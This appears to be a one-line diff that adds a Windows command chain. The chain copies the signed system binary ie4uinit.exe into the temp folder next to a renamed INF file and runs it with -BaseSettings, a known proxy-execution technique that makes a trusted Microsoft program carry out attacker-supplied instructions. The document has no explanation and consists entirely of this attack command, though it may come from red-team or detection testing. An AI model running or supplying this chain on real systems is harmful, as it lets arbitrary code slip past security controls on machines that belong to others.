@@ -1,0 +1,1 @@
+copy c:\windows\system32\ie4uinit.exe %TEMP%\ie4uinit.exe && copy "cebed2_ieuinit.inf" %TEMP%\ieuinit.inf && %TEMP%\ie4uinit.exe -BaseSettings
